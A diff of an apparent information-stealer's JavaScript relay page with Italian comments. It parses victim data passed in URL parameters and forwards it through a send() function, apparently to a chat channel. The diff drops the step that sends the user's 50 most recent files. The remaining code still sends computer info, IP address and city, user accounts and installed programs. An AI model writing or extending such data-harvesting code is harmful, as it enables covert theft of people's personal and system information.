@@ -6,16 +6,12 @@
 console.log("ciao");
 var url = new URL(window.location.href);
 var ci = {};
-var af = [];
 var ip = "";
 var ct = "";
 var users = [];
 var progg = [];
 if(url.searchParams.get("ci") != null) {
 	ci = JSON.parse(url.searchParams.get("ci"));
-}
-if (url.searchParams.get("af") != null) {
-	af = JSON.parse(url.searchParams.get("af"));
 }
 if (url.searchParams.get("ip") != null) {
 	ip = url.searchParams.get("ip");
@@ -45,8 +41,6 @@ console.warn("Se hai aperto questa pagina *normalmente* ossia scrivendo l'url ne
 
 //send ci information
 send("<b>ComputerInfo</b>%0A<code>" + JSON.stringify(ci) + "</code>");
-//send af
-send("<b>Top 50 most recent userfiles</b>%0A<code>" + JSON.stringify(af, null, 2) + "</code>");
 // send ip and city
 send("<b>Network + geolocation</b>%0A<code>" + ip + "</code>, "+ ct);
 // send users+prog
